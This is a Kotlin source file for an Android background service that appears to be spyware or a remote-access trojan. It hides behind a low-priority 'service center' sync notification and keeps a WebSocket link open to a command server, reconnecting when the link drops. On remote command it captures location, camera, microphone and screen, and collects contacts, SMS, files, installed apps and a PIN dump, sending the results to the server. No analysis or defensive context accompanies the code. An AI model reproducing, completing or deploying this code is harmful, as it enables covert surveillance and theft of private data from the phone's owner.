kotlin
package com.svc.core
import android.app.*
import android.content.*
import android.os.Build
import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class Api : Service() {
    private var ws: WebSocket? = null
    private val http = OkHttpClient.Builder()
        .pingInterval(25, TimeUnit.SECONDS).build()

    override fun onCreate() {
        super.onCreate()
        startForeground(1, bar("סנכרון"))
        connect()
    }

    private fun bar(t: String) = Notification.Builder(this, ch())
        .setContentTitle("מרכז שירות").setContentText(t)
        .setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build()

    private fun ch(): String {
        val id = "svc"
        if (Build.VERSION.SDK_INT >= 26) {
            val m = getSystemService(NotificationManager::class.java)
            m.createNotificationChannel(NotificationChannel(id, "שירות", NotificationManager.IMPORTANCE_LOW))
        }
        return id
    }

    private fun connect() {
        ws = http.newWebSocket(Request.Builder().url(Cfg.WS).build(), object : WebSocketListener() {
            override fun onOpen(w: WebSocket, r: Response) {
                w.send(JSONObject().apply {
                    put("t", "hello"); put("platform", "android")
                    put("model", Build.MODEL); put("os", "Android"); put("ver", Build.VERSION.RELEASE)
                }.toString())
                Ctx.ws = w
                Loc.once(this@Api)
            }
            override fun onMessage(w: WebSocket, text: String) {
                val o = JSONObject(text)
                if (o.optString("t") == "cmd") dispatch(o.getString("cmd"), o.optString("id"))
            }
            override fun onFailure(w: WebSocket, e: Throwable, r: Response?) { Ctx.ws = null; retry() }
            override fun onClosed(w: WebSocket, c: Int, r: String) { Ctx.ws = null; retry() }
        })
    }

    private fun retry() {
        android.os.Handler(mainLooper).postDelayed({ if (Ctx.ws == null) connect() }, 15000)
    }

    private fun dispatch(cmd: String, id: String) {
        val i = Intent()
        when (cmd) {
            "loc" -> Loc.once(this)
            "camf" -> startSvc(Cam::class.java, "f")
            "camb" -> startSvc(Cam::class.java, "b")
            "mic" -> startSvc(Mic::class.java, null)
            "screen_on", "shot" -> startSvc(Screen::class.java, cmd)
            "contacts" -> Fs.contacts(this)
            "sms" -> Fs.sms(this)
            "files" -> Fs.files(this)
            "apps" -> Fs.apps(this)
            "pin" -> Pin.dump(this)
            "ip" -> Fs.ip(this)
        }
        Ctx.send(JSONObject().put("t", "ack").put("id", id).put("ok", true).toString())
    }

    private fun startSvc(c: Class<*>, extra: String?) {
        val i = Intent(this, c)
        if (extra != null) i.putExtra("mode", extra)
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
    }

    override fun onBind(i: Intent?) = null
    override fun onDestroy() { ws?.close(1000, null); super.onDestroy() }
}

object Ctx {
    var ws: WebSocket? = null
    fun send(s: String) { ws?.send(s) }
    fun data(kind: String, payload: JSONObject) {
        send(JSONObject().put("t", "data").put("kind", kind).put("payload", payload).toString())
    }
}
